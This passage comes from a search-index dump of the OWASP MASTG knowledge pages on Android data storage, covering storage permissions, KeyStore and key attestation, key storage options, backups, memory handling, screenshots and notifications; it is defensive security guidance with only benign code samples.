higher:</p> <ul> <li> <p>Accessing own media files:</p> <ul> <li>Apps can always access their own media files stored using the <code>MediaStore</code> API without needing any storage-related permissions. This includes files in the app-specific directories within external storage (scoped storage) and files in the MediaStore that the app created.</li> </ul> </li> <li> <p>Accessing other apps' media files:</p> <ul> <li>Apps require certain permissions and APIs to access media files that belong to other apps.</li> <li>If scoped storage is enabled, apps can't access the app-specific media files that belong to other apps. However, if scoped storage is disabled, apps can access the app-specific media files that belong to other apps using the <code>MediaStore.Files</code> query.</li> </ul> </li> <li> <p>Accessing downloads (<code>MediaStore.Downloads</code> collection):</p> <ul> <li>To access downloads from other apps, the app must use the Storage Access Framework.</li> </ul> </li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0042/#manifest-permissions","title":"Manifest Permissions","text":"<p>Android defines the following permissions for accessing external storage: <code>READ_EXTERNAL_STORAGE</code>, <code>WRITE_EXTERNAL_STORAGE</code> and <code>MANAGE_EXTERNAL_STORAGE</code>.</p> <p>An app must declare in the Android Manifest file an intention to write to shared locations. Below you can find a list of such manifest permissions:</p> <ul> <li> <p><code>READ_EXTERNAL_STORAGE</code>: allows an app to read from external storage.</p> <ul> <li>Before Android 4.4 (API level 19), this permission is not enforced and all apps have access to read the entire external storage (including files from other apps).</li> <li>Starting on Android 4.4 (API level 19), apps don't need to request this permission to access their own app-specific directories within external storage.</li> <li>Starting on Android 10 (API level 29), scoped storage applies by default:<ul> <li>Apps cannot read the app-specific directories that belong to other apps (which was possible before when having <code>READ_EXTERNAL_STORAGE</code> granted).</li> <li>Apps don't need to have this permission to read files from their own app-specific directories within external storage (scoped storage), or their own files in the MediaStore.</li> </ul> </li> <li>Starting on Android 13 (API level 33), this permission has no effect. If needing to access media files from other apps, apps must request one or more of these permissions: <code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code>, or <code>READ_MEDIA_AUDIO</code>.</li> </ul> </li> <li> <p><code>WRITE_EXTERNAL_STORAGE</code>: allows an app to write a file to the \"external storage\", regardless of the actual storage origin (external disk or internally emulated by the system).</p> <ul> <li>Starting on Android 4.4 (API level 19), apps don't need to request this permission to access their own app-specific directories within external storage.</li> <li>Starting on Android 10 (API level 29), scoped storage applies by default:<ul> <li>Apps cannot write to the app-specific directories that belong to other apps (which was possible before when having <code>WRITE_EXTERNAL_STORAGE</code> granted).</li> <li>Apps don't need this permission to write files in their own app-specific directories within external storage.</li> </ul> </li> <li>Starting on Android 11 (API level 30), this permission is deprecated and has no effect, but can be preserved with requestLegacyExternalStorage and preserveLegacyExternalStorage.</li> </ul> </li> <li> <p><code>MANAGE_EXTERNAL_STORAGE</code>: Some apps require broad access to all files.</p> <ul> <li>This permission only applies to apps targeting Android 11.0 (API level 30) or higher.</li> <li>Usage of this permission is restricted by Google Play unless the app satisfies certain requirements and requires special app access called \"All files access\".</li> <li>Scoped storage doesn't affect the app's ability to access app-specific directories when having this permission.</li> </ul> </li> <li> <p><code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code> and <code>READ_MEDIA_AUDIO</code>: allow an app to read media files from the <code>MediaStore</code> collection.</p> <ul> <li>Starting on Android 13 (API level 33), since <code>READ_EXTERNAL_STORAGE</code> has no effect, these permissions are required to access media files from the <code>MediaStore.Images</code>, <code>MediaStore.Video</code>, and <code>MediaStore.Audio</code> collections respectively.</li> </ul> </li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0043/","title":"MASTG-KNOW-0043: Android KeyStore","text":"<p>The Android KeyStore supports relatively secure credential storage. As of Android 4.3 (API level 18), it provides public APIs for storing and using app-private keys. An app can use a public key to create a new private/public key pair for encrypting application secrets, and it can decrypt the secrets with the private key.</p> <p>You can protect keys stored in the Android KeyStore with user authentication in a confirm credential flow. The user's lock screen credentials (pattern, PIN, password, or fingerprint) are used for authentication.</p> <p>You can use stored keys in one of two modes:</p> <ol> <li> <p>Users are authorized to use keys for a limited period of time after authentication. In this mode, all keys can be used as soon as the user unlocks the device. You can customize the period of authorization for each key. You can use this option only if the secure lock screen is enabled. If the user disables the secure lock screen, all stored keys will become permanently invalid.</p> </li> <li> <p>Users are authorized to use a specific cryptographic operation that is associated with one key. In this mode, users must request a separate authorization for each operation that involves the key. Currently, fingerprint authentication is the only way to request such authorization.</p> </li> </ol> <p>The level of security afforded by the Android KeyStore depends on its implementation, which depends on the device. Most modern devices offer a hardware-backed KeyStore implementation: keys are generated and used in a Trusted Execution Environment (TEE) or a Secure Element (SE), and the operating system can't access them directly. This means that the encryption keys themselves can't be easily retrieved, even from a rooted device. You can verify hardware-backed keys with  Key Attestation. You can determine whether the keys are inside the secure hardware by checking the return value of the <code>isInsideSecureHardware</code> method, which is part of the <code>KeyInfo</code> class.</p> <p>Note that the relevant KeyInfo indicates that secret keys and HMAC keys are insecurely stored on several devices despite private keys being correctly stored on the secure hardware.</p> <p>The keys of a software-only implementation are encrypted with a per-user encryption master key. An attacker can access all keys stored on rooted devices that have this implementation in the folder <code>/data/misc/keystore/</code>. Because the user's lock screen pin/password is used to generate the master key, the Android KeyStore is unavailable when the device is locked. For more security Android 9 (API level 28) introduces the <code>unlockedDeviceRequired</code> flag. By passing <code>true</code> to the <code>setUnlockedDeviceRequired</code> method, the app prevents its keys stored in <code>AndroidKeystore</code> from being decrypted when the device is locked, and it requires the screen to be unlocked before allowing decryption.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0043/#hardware-backed-android-keystore","title":"Hardware-backed Android KeyStore","text":"<p>The hardware-backed Android KeyStore gives another layer to defense-in-depth security concept for Android. Keymaster Hardware Abstraction Layer (HAL) was introduced with Android 6 (API level 23). Applications can verify if the key is stored inside the security hardware (by checking if <code>KeyInfo.isinsideSecureHardware</code> returns <code>true</code>). Devices running Android 9 (API level 28) and higher can have a <code>StrongBox Keymaster</code> module, an implementation of the Keymaster HAL that resides in a hardware security module which has its own CPU, secure storage, a true random number generator and a mechanism to resist package tampering. To use this feature, <code>true</code> must be passed to the <code>setIsStrongBoxBacked</code> method in either the <code>KeyGenParameterSpec.Builder</code> class or the <code>KeyProtection.Builder</code> class when generating or importing keys using <code>AndroidKeystore</code>. To make sure that StrongBox is used during runtime, check that <code>isInsideSecureHardware</code> returns <code>true</code> and that the system does not throw <code>StrongBoxUnavailableException</code>, which gets thrown if the StrongBox Keymaster isn't available for the given algorithm and key size associated with a key. Description of features on hardware-based keystore can be found on AOSP pages.</p> <p>Keymaster HAL is an interface to hardware-backed components - Trusted Execution Environment (TEE) or a Secure Element (SE), which is used by Android Keystore. An example of such a hardware-backed component is Titan M.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0044/","title":"MASTG-KNOW-0044: Key Attestation","text":"<p>For the applications which heavily rely on Android Keystore for business-critical operations, such as multi-factor authentication through cryptographic primitives, secure storage of sensitive data at the client-side, etc. Android provides the feature of Key Attestation, which helps to analyze the security of cryptographic material managed through Android Keystore. From Android 8.0 (API level 26), the key attestation was made mandatory for all new (Android 7.0 or higher) devices that need to have device certification for Google apps. Such devices use attestation keys signed by the Google hardware Attestation Root certificate and the same can be verified through the key attestation process.</p> <p>During key attestation, we can specify the alias of a key pair and in return, get a certificate chain, which we can use to verify the properties of that key pair. If the root certificate of the chain is the Google Hardware Attestation Root certificate, and the checks related to key pair storage in hardware are made, it gives an assurance that the device supports hardware-level key attestation, and that the key is in the hardware-backed keystore that Google believes to be secure. Alternatively, if the attestation chain has any other root certificate, then Google does not make any claims about the security of the hardware.</p> <p>Although the key attestation process can be implemented within the application directly, it is recommended that it should be implemented at the server-side for security reasons. The following are the high-level guidelines for the secure implementation of Key Attestation:</p> <ul> <li>The server should initiate the key attestation process by creating a random number securely using CSPRNG (Cryptographically Secure Random Number Generator) and the same should be sent to the user as a challenge.</li> <li>The client should call the <code>setAttestationChallenge</code> API with the challenge received from the server and should then retrieve the attestation certificate chain using the <code>KeyStore.getCertificateChain</code> method.</li> <li>The attestation response should be sent to the server for the verification and following checks should be performed for the verification of the key attestation response:<ul> <li>Verify the certificate chain, up to the root and perform certificate sanity checks such as validity, integrity and trustworthiness. Check the Certificate Revocation Status List maintained by Google, if none of the certificates in the chain was revoked.</li> <li>Check if the root certificate is signed with the Google attestation root key which makes the attestation process trustworthy.</li> <li>Extract the attestation certificate extension data, which appears within the first element of the certificate chain, and perform the following checks:<ul> <li>Verify that the attestation challenge is having the same value which was generated at the server while initiating the attestation process.</li> <li>Verify the signature in the key attestation response.</li> <li>Verify the security level of the Keymaster, to determine if the device has secure key storage mechanism. Keymaster is a piece of software that runs in the security context and provides all the secure keystore operations. The security level will be one of <code>Software</code>, <code>TrustedEnvironment</code> or <code>StrongBox</code>. The client supports hardware-level key attestation if the security level is <code>TrustedEnvironment</code> or <code>StrongBox</code> and the attestation certificate chain contains a root certificate signed with the Google attestation root key.</li> <li>Verify the client's status to ensure a full chain of trust - verified boot key, locked bootloader and verified boot state.</li> <li>Additionally, you can verify the key pair's attributes such as purpose, access time, authentication requirement, etc.</li> </ul> </li> </ul> </li> </ul> <p>Note, if for any reason that process fails, it means that the key is not in security hardware. That does not mean that the key is compromised.</p> <p>The typical example of Android Keystore attestation response looks like this:</p> <pre><code>{\n    \"fmt\": \"android-key\",\n    \"authData\": \"9569088f1ecee3232954035dbd10d7cae391305a2751b559bb8fd7cbb229bd...\",\n    \"attStmt\": {\n        \"alg\": -7,\n        \"sig\": \"304402202ca7a8cfb6299c4a073e7e022c57082a46c657e9e53...\",\n        \"x5c\": [\n            \"308202ca30820270a003020102020101300a06082a8648ce3d040302308188310b30090603550406130...\",\n            \"308202783082021ea00302010202021001300a06082a8648ce3d040302308198310b300906035504061...\",\n            \"3082028b30820232a003020102020900a2059ed10e435b57300a06082a8648ce3d040302308198310b3...\"\n        ]\n    }\n}\n</code></pre> <p>In the above JSON snippet, the keys have the following meaning:</p> <ul> <li><code>fmt</code>: Attestation statement format identifier</li> <li><code>authData</code>: It denotes the authenticator data for the attestation</li> <li><code>alg</code>: The algorithm that is used for the Signature</li> <li><code>sig</code>: Signature</li> <li><code>x5c</code>: Attestation certificate chain</li> </ul> <p>Note: The <code>sig</code> is generated by concatenating <code>authData</code> and <code>clientDataHash</code> (challenge sent by the server) and signing through the credential private key using the <code>alg</code> signing algorithm. The same is verified at the server-side by using the public key in the first certificate.</p> <p>For more understanding on the implementation guidelines, you can refer to Google Sample Code.</p> <p>For the security analysis perspective, the analysts may perform the following checks for the secure implementation of Key Attestation:</p> <ul> <li>Check if the key attestation is totally implemented on the client-side. In which case, it can be more easily bypassed by tampering the application, method hooking, etc.</li> <li>Check if the server uses random challenge while initiating the key attestation. As failing to do that would lead to insecure implementation thus making it vulnerable to replay attacks. Also, checks pertaining to the randomness of the challenge should be performed.</li> <li>Check if the server verifies the integrity of the key attestation response.</li> <li>Check if the server performs basic checks such as integrity verification, trust verification, validity, etc. on the certificates in the chain.</li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0045/","title":"MASTG-KNOW-0045: Secure Key Import into Keystore","text":"<p>Android 9 (API level 28) adds the ability to import keys securely into the <code>AndroidKeystore</code>. First, <code>AndroidKeystore</code> generates a key pair using <code>PURPOSE_WRAP_KEY</code>, which should also be protected with an attestation certificate. This pair aims to protect the Keys being imported to <code>AndroidKeystore</code>. The encrypted keys are generated as ASN.1-encoded message in the <code>SecureKeyWrapper</code> format, which also contains a description of the ways the imported key is allowed to be used. The keys are then decrypted inside the <code>AndroidKeystore</code> hardware belonging to the specific device that generated the wrapping key, so that they never appear as plaintext in the device's host memory.</p> <p></p> <p>Example in Java:</p> <pre><code>KeyDescription ::= SEQUENCE {\n    keyFormat INTEGER,\n    authorizationList AuthorizationList\n}\n\nSecureKeyWrapper ::= SEQUENCE {\n    wrapperFormatVersion INTEGER,\n    encryptedTransportKey OCTET_STRING,\n    initializationVector OCTET_STRING,\n    keyDescription KeyDescription,\n    secureKey OCTET_STRING,\n    tag OCTET_STRING\n}\n</code></pre> <p>The code above presents the different parameters to be set when generating the encrypted keys in the SecureKeyWrapper format. Check the Android documentation on <code>WrappedKeyEntry</code> for more details.</p> <p>When defining the KeyDescription AuthorizationList, the following parameters will affect the encrypted keys security:</p> <ul> <li>The <code>algorithm</code> parameter specifies the cryptographic algorithm with which the key is used</li> <li>The <code>keySize</code> parameter specifies the size, in bits, of the key, measuring in the normal way for the key's algorithm</li> <li>The <code>digest</code> parameter specifies the digest algorithms that may be used with the key to perform signing and verification operations</li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0046/","title":"MASTG-KNOW-0046: BouncyCastle KeyStore","text":"<p>Deprecated</p> <p>Reason: While the BKS (BouncyCastle Keystore) was not removed from the system KeyStore providers, BouncyCastle support for cryptographic operations on Android was deprecated in Android 9 (API level 28) and finally removed in Android 12 (API level 31).</p> <p>Use instead:</p> <ul> <li> Android KeyStore</li> </ul> <p>Older Android versions don't include KeyStore, but they do include the KeyStore interface from JCA (Java Cryptography Architecture). You can use KeyStores that implement this interface to ensure the secrecy and integrity of keys stored with KeyStore; BouncyCastle KeyStore (BKS) is recommended. All implementations are based on the fact that files are stored on the filesystem; all files are password-protected.</p> <p>To create one, use the <code>KeyStore.getInstance(\"BKS\", \"BC\") method</code>, where \"BKS\" is the KeyStore name (BouncyCastle Keystore) and \"BC\" is the provider (BouncyCastle). You can also use SpongyCastle as a wrapper and initialize the KeyStore as follows: <code>KeyStore.getInstance(\"BKS\", \"SC\")</code>.</p> <p>Be aware that not all KeyStores properly protect the keys stored in the KeyStore files.</p>","tags":["android","MASVS-STORAGE","know","deprecated"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/","title":"MASTG-KNOW-0047: Cryptographic Key Storage","text":"<p>To mitigate unauthorized use of keys on the Android device, Android KeyStore lets apps specify authorized uses of their keys when generating or importing the keys. Once made, authorizations cannot be changed.</p> <p>Storing a Key - from most secure to least secure:</p> <ul> <li>the key is stored in hardware-backed Android KeyStore</li> <li>all keys are stored on server and are available after strong authentication</li> <li>the master key is stored on the server and used to encrypt other keys, which are stored in Android SharedPreferences</li> <li>the key is derived each time from a strong user provided passphrase with sufficient length and salt</li> <li>the key is stored in the software implementation of Android KeyStore</li> <li>the master key is stored in the software implementation of Android Keystore and used to encrypt other keys, which are stored in SharedPreferences</li> <li>[not recommended] all keys are stored in SharedPreferences</li> <li>[not recommended] hardcoded encryption keys in the source code</li> <li>[not recommended] predictable obfuscation function or key derivation function based on stable attributes</li> <li>[not recommended] stored generated keys in public places (like <code>/sdcard/</code>)</li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/#storing-keys-using-hardware-backed-android-keystore","title":"Storing Keys Using Hardware-backed Android KeyStore","text":"<p>You can use the hardware-backed Android KeyStore ( Android KeyStore) if the device is running Android 7.0 (API level 24) and above with available hardware component (Trusted Execution Environment (TEE) or a Secure Element (SE)). You can even verify that the keys are hardware-backed by using the guidelines provided for the secure implementation of Key Attestation ( Key Attestation). If a hardware component is not available and/or support for Android 6.0 (API level 23) and below is required, then you might want to store your keys on a remote server and make them available after authentication.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/#storing-keys-on-the-server","title":"Storing Keys on the Server","text":"<p>It is possible to securely store keys on a key management server, however the app needs to be online to decrypt the data. This might be a limitation for certain mobile app use cases and should be carefully thought through, as this becomes part of the architecture of the app and might highly impact usability.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/#deriving-keys-from-user-input","title":"Deriving Keys from User Input","text":"<p>Deriving a key from a user provided passphrase is a common solution (depending on which Android API level you use), but it also impacts usability, might affect the attack surface and could introduce additional weaknesses.</p> <p>Each time the application needs to perform a cryptographic operation, the user's passphrase is needed. Either the user is prompted for it every time, which isn't an ideal user experience, or the passphrase is kept in memory as long as the user is authenticated. Keeping the passphrase in memory is not a best-practice, as any cryptographic material must only be kept in memory while it is being used. Zeroing out a key is often a very challenging task as explained in \"Cleaning out Key Material\".</p> <p>Additionally, consider that keys derived from a passphrase have their own weaknesses. For instance, the passwords or passphrases might be reused by the user or easy to guess. Please refer to the chapter \"Testing Cryptography\" for more information.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/#cleaning-out-key-material","title":"Cleaning out Key Material","text":"<p>The key material should be cleared out from memory as soon as it is not need anymore. There are certain limitations of reliably cleaning up secret data in languages with garbage collector (Java) and immutable strings (Swift, Objective-C, Kotlin). Java Cryptography Architecture Reference Guide suggests using <code>char[]</code> instead of <code>String</code> for storing sensitive data, and nullify array after usage.</p> <p>Note that some ciphers do not properly clean up their byte-arrays. For instance, the AES Cipher in BouncyCastle does not always clean up its latest working key, leaving some copies of the byte-array in memory. Next, BigInteger based keys (e.g. private keys) cannot be removed from the heap, nor zeroed out without additional effort. Clearing byte array can be achieved by writing a wrapper which implements Destroyable.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/#storing-keys-using-android-keystore-api","title":"Storing Keys using Android KeyStore API","text":"<p>A more user-friendly and recommended way is to use the Android KeyStore API system (itself or through KeyChain) to store key material. If it is possible, hardware-backed storage should be used. Otherwise, it should fallback to software implementation of Android Keystore. However, be aware that the <code>AndroidKeyStore</code> API has been changed significantly throughout versions of Android. In earlier versions, the <code>AndroidKeyStore</code> API only supported storing public/private key pairs (e.g., RSA). Symmetric key support has only been added since Android 6.0 (API level 23). As a result, a developer needs to handle the different Android API levels to securely store symmetric keys.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/#storing-keys-by-encrypting-them-with-other-keys","title":"Storing keys by encrypting them with other keys","text":"<p>In order to securely store symmetric keys on devices running on Android 5.1 (API level 22) or lower, we need to generate a public/private key pair. We encrypt the symmetric key using the public key and store the private key in the <code>AndroidKeyStore</code>. The encrypted symmetric key can be encoded using base64 and stored in the <code>SharedPreferences</code>. Whenever we need the symmetric key, the application retrieves the private key from the <code>AndroidKeyStore</code> and decrypts the symmetric key.</p> <p>Envelope encryption, or key wrapping, is a similar approach that uses symmetric encryption to encapsulate key material. Data encryption keys (DEKs) can be encrypted with key encryption keys (KEKs) which are securely stored. Encrypted DEKs can be stored in <code>SharedPreferences</code> or written to files. When required, the application reads the KEK, then decrypts the DEK. Refer to OWASP Cryptographic Storage Cheat Sheet to learn more about encrypting cryptographic keys.</p> <p>Also, as the illustration of this approach, refer to the <code>EncryptedSharedPreferences</code> from the Jetpack security crypto library.</p> <p>Warning</p> <p>The Jetpack security crypto library, including the <code>EncryptedFile</code> and  <code>EncryptedSharedPreferences</code> classes, has been deprecated. However, since an official replacement has not yet been released, we recommend using these classes until one is available.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/#insecure-options-to-store-keys","title":"Insecure options to store keys","text":"<p>A less secure way of storing encryption keys, is in the SharedPreferences of Android. When SharedPreferences are used, the file is only readable by the application that created it. However, on rooted devices, any other application with root access can read the SharedPreferences file of other apps. This is not the case for the AndroidKeyStore, since AndroidKeyStore access is managed on the kernel level, which needs considerably more work and skill to bypass without the AndroidKeyStore clearing or destroying the keys.</p> <p>The last three options are to use hardcoded encryption keys in the source code, having a predictable obfuscation function or key derivation function based on stable attributes, and storing generated keys in public places like <code>/sdcard/</code>. Hardcoded encryption keys are an issue, since this means every instance of the application uses the same encryption key. An attacker can reverse-engineer a local copy of the application to extract the cryptographic key, and use that key to decrypt any data which was encrypted by the application on any device.</p> <p>Next, when you have a predictable key derivation function based on identifiers which are accessible to other applications, the attacker only needs to find the KDF and apply it to the device to find the key. Lastly, storing encryption keys publicly is also highly discouraged, as other applications can have permission to read the public partition and steal the keys.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/#data-encryption-using-third-party-libraries","title":"Data Encryption Using Third Party Libraries","text":"<p>There are several different open-source libraries that offer encryption capabilities specific to the Android platform.</p> <ul> <li>Java AES Crypto - A simple Android class for encrypting and decrypting strings.</li> <li>SQL Cipher - SQLCipher is an open source extension to SQLite that provides transparent 256-bit AES encryption of database files.</li> <li>Themis - A cross-platform high-level cryptographic library that provides the same API across many platforms, for securing data during authentication, storage, messaging, etc.</li> </ul> <p>Please keep in mind that as long as the key is not stored in the KeyStore, it is always possible to easily retrieve the key on a rooted device and then decrypt the values you are trying to protect.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0048/","title":"MASTG-KNOW-0048: KeyChain","text":"<p>The KeyChain class is used to store and retrieve system-wide private keys and their corresponding certificates (chain). The user will be prompted to set a lock screen pin or password to protect the credential storage if something is being imported into the KeyChain for the first time. Note that the KeyChain is system-wide, every application can access the materials stored in the KeyChain.</p> <p>Inspect the source code to determine whether native Android mechanisms identify sensitive information. Sensitive information should be encrypted, not stored in clear text. For sensitive information that must be stored on the device, several API calls are available to protect the data via the <code>KeyChain</code> class. Complete the following steps:</p> <ul> <li>Make sure that the app is using the Android KeyStore and Cipher mechanisms to securely store encrypted information on the device. Look for the patterns <code>AndroidKeystore</code>, <code>import java.security.KeyStore</code>, <code>import javax.crypto.Cipher</code>, <code>import java.security.SecureRandom</code>, and corresponding usages.</li> <li>Use the <code>store(OutputStream stream, char[] password)</code> function to store the KeyStore to disk with a password. Make sure that the password is provided by the user, not hard-coded.</li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0049/","title":"MASTG-KNOW-0049: Logs","text":"<p>There are many legitimate reasons to create log files on a mobile device, such as keeping track of crashes, errors, and usage statistics. Log files can be stored locally when the app is offline and sent to the endpoint once the app is online. However, logging sensitive data may expose the data to attackers or malicious applications, and it might also violate user confidentiality.</p> <p>You can create log files in several ways. The following list includes two classes that are available for Android:</p> <ul> <li>Log Class</li> <li>Logger Class</li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0050/","title":"MASTG-KNOW-0050: Backups","text":"<p>Android backups usually include copies of data and settings for all installed apps. Given its diverse ecosystem, Android supports many backup options:</p> <ul> <li> <p>Stock Android has built-in USB backup facilities. When USB debugging is enabled, use the <code>adb backup</code> command (restricted since Android 12, requires <code>android:debuggable=true</code> in the AndroidManifest.xml) to create full data backups and backups of an app's data directory.</p> </li> <li> <p>Google provides a \"Back Up My Data\" feature that backs up all app data to Google's servers.</p> </li> <li> <p>Two Backup APIs are available to app developers:</p> <ul> <li> <p>Key/Value Backup (Backup API or Android Backup Service) uploads to the Android Backup Service cloud.</p> </li> <li> <p>Auto Backup for Apps: With Android 6.0 (API level 23) and above, Google added the \"Auto Backup for Apps feature\". This feature automatically syncs at most 25MB of app data with the user's Google Drive account.</p> </li> </ul> </li> <li> <p>OEMs may provide additional options. For example, HTC devices have a \"HTC Backup\" option that performs daily backups to the cloud when activated.</p> </li> </ul> <p>Apps must carefully ensure that sensitive user data doesn't end within these backups as this may allow an attacker to extract it.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0050/#adb-backup-support","title":"ADB Backup Support","text":"<p>Android provides an attribute called <code>allowBackup</code> to back up all your application data. This attribute is set in the <code>AndroidManifest.xml</code> file. If the value of this attribute is true, the device allows users to back up the application with Android Debug Bridge (ADB) via the command <code>$ adb backup</code> (restricted in Android 12).</p> <p>To prevent the app data backup, set the <code>android:allowBackup</code> attribute to false. When this attribute is unavailable, the allowBackup setting is enabled by default, and backup must be manually deactivated.</p> <p>Note: If the device was encrypted, then the backup files will be encrypted as well.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0051/","title":"MASTG-KNOW-0051: Process Memory","text":"<p>All applications on Android use memory to perform normal computational operations like any regular modern-day computer. It is of no surprise then that at times sensitive operations will be performed within process memory. For this reason, it is important that once the relevant sensitive data has been processed, it should be disposed from process memory as quickly as possible.</p> <p>The investigation of an application's memory can be done from memory dumps, and from analyzing the memory in real time via a debugger.</p> <p>For an overview of possible sources of data exposure, check the documentation and identify application components before you examine the source code. For example, sensitive data from a backend may be in the HTTP client, the XML parser, etc. You want all these copies to be removed from memory as soon as possible.</p> <p>In addition, understanding the application's architecture and the architecture's role in the system will help you identify sensitive information that doesn't have to be exposed in memory at all. For example, assume your app receives data from one server and transfers it to another without any processing. That data can be handled in an encrypted format, which prevents exposure in memory.</p> <p>However, if you need to expose sensitive data in memory, you should make sure that your app is designed to expose as few data copies as possible as briefly as possible. In other words, you want the handling of sensitive data to be centralized (i.e., with as few components as possible) and based on primitive, mutable data structures.</p> <p>The latter requirement gives developers direct memory access. Make sure that they use this access to overwrite the sensitive data with dummy data (typically zeroes). Examples of preferable data types include <code>byte []</code> and <code>char []</code>, but not <code>String</code> or <code>BigInteger</code>. Whenever you try to modify an immutable object like <code>String</code>, you create and change a copy of the object.</p> <p>Using non-primitive mutable types like <code>StringBuffer</code> and <code>StringBuilder</code> may be acceptable, but it's indicative and requires care. Types like <code>StringBuffer</code> are used to modify content (which is what you want to do). To access such a type's value, however, you would use the <code>toString</code> method, which would create an immutable copy of the data. There are several ways to use these data types without creating an immutable copy, but they require more effort than using a primitive array. Safe memory management is one benefit of using types like <code>StringBuffer</code> , but this can be a two-edged sword. If you try to modify the content of one of these types and the copy exceeds the buffer capacity, the buffer size will automatically increase. The buffer content may be copied to a different location, leaving the old content without a reference use to overwrite it.</p> <p>Unfortunately, few libraries and frameworks are designed to allow sensitive data to be overwritten. For example, destroying a key, as shown below, doesn't remove the key from memory:</p> <pre><code>val secretKey: SecretKey = SecretKeySpec(\"key\".toByteArray(), \"AES\")\nsecretKey.destroy()\n</code></pre> <p>Overwriting the backing byte-array from <code>secretKey.getEncoded</code> doesn't remove the key either; the SecretKeySpec-based key returns a copy of the backing byte-array. See the sections below for the proper way to remove a <code>SecretKey</code> from memory.</p> <p>The RSA key pair is based on the <code>BigInteger</code> type and therefore resides in memory after its first use outside the <code>AndroidKeyStore</code>. Some ciphers (such as the AES <code>Cipher</code> in <code>BouncyCastle</code>) do not properly clean up their byte-arrays.</p> <p>User-provided data (credentials, social security numbers, credit card information, etc.) is another type of data that may be exposed in memory. Regardless of whether you flag it as a password field, <code>EditText</code> delivers content to the app via the <code>Editable</code> interface. If your app doesn't provide <code>Editable.Factory</code>, user-provided data will probably be exposed in memory for longer than necessary. The default <code>Editable</code> implementation, the <code>SpannableStringBuilder</code>, causes the same issues as Java's <code>StringBuilder</code> and <code>StringBuffer</code> cause (discussed above).</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0052/","title":"MASTG-KNOW-0052: User Interface Components","text":"<p>At certain points in time, the user will have to enter sensitive information into the application. This data may be financial information such as credit card data or user account passwords, or maybe healthcare data. The data may be exposed if the app doesn't properly mask it while it is being typed.</p> <p>In order to prevent disclosure and mitigate risks such as shoulder surfing you should verify that no sensitive data is exposed via the user interface unless explicitly required (e.g. a password being entered). For the data required to be present it should be properly masked, typically by showing asterisks or dots instead of clear text.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0053/","title":"MASTG-KNOW-0053: Screenshots","text":"<p>Manufacturers want to provide device users with an aesthetically pleasing experience at application startup and exit, so they introduced the screenshot-saving feature for use when the application is backgrounded. This feature may pose a security risk. Sensitive data may be exposed if the user deliberately screenshots the application while sensitive data is displayed. A malicious application that is running on the device and able to continuously capture the screen may also expose data. Screenshots are written to local storage, from which they may be recovered by a rogue application (if the device is rooted) or someone who has stolen the device.</p> <p>For example, capturing a screenshot of a banking application may reveal information about the user's account, credit, transactions, and so on.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0054/","title":"MASTG-KNOW-0054: App Notifications","text":"<p>It is important to understand that notifications should never be considered private. When a notification is handled by the Android system it is broadcasted system-wide and any application running with a NotificationListenerService can listen for these notifications to receive them in full and may handle them however it wants.</p> <p>There are many known malware samples such as Joker, and Alien which abuses the <code>NotificationListenerService</code> to listen for notifications on the device and then send them to attacker-controlled C2 infrastructure. Commonly this is done to listen for two-factor authentication (2FA) codes that appear as notifications on the device which are then sent to the attacker. A safer alternative for the user would be to use a 2FA application that does not generate notifications.</p> <p>Furthermore there are a number of apps on the Google Play Store that provide notification logging, which logs locally any notifications on the Android system. This highlights that notifications are in no way private on Android and accessible by any other app on the device.</p> <p>For this reason all notification usage should be inspected for confidential or high risk information that could be used by malicious applications.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0055/","title":"MASTG-KNOW-0055: Keyboard Cache","text":"<p>When users enter information into input fields, the keyboard software often provides suggestions based on previously entered data. This auto-completion feature can be 